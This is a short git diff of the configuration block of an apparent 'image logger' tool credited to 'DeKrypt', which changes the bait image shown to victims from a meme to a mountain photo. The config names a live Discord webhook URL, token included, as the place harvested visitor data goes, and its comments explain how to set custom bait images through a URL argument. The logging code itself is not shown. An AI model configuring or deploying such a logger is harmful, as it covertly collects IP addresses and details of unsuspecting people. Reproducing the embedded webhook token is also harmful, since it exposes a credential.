@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1538395973792043109/5kwVyiDP_LHmqdiDu9dvoIpFc17MUlHZ5ZrLSH1vcVE3h9-wvSinjQ_QFk_2ECSlx-WV",
-    "image": "https://freepngimg.com/download/meme/98800-meme-dank-download-hq.png", # You can also have a custom image by using a URL argument
+    "image": "https://img.magnific.com/free-vector/top-high-rocky-mountains-clouds-night_107791-25978.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
